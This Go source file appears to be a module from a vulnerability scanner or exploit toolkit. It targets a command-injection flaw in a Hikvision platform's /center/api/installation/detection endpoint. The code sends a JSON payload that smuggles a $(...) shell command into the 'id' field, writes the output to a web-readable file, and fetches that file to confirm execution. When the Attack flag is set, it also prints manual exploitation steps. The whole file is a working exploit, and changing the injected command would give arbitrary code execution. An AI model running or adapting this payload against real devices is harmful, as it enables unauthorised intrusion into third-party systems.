package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func HaiKangWeiShi_CommandInjection(url string, Attack bool) error {
	payload := `{"type": "environment", "operate": "", "machines": {"id": "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/test12.txt)"}}`

	payload = strings.ReplaceAll(payload, "\n", "\r\n")
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/center/api/installation/detection", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/json;charset=UTF-8")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	url2 := fmt.Sprintf("%s/vms/static/test12.txt", url)
	request2, err := http.NewRequest("GET", url2, nil)
	if err != nil {
	}

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body2), "uid=") {
		fmt.Println("[*]HaiKangWeiShi_CommandInjection : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/center/api/installation/detection，并传入请求体`{\"type\": \"environment\", \"operate\": \"\", \"machines\": {\"id\": \"$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/test12.txt)\"}}\n再访问/vms/static/test12.txt`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
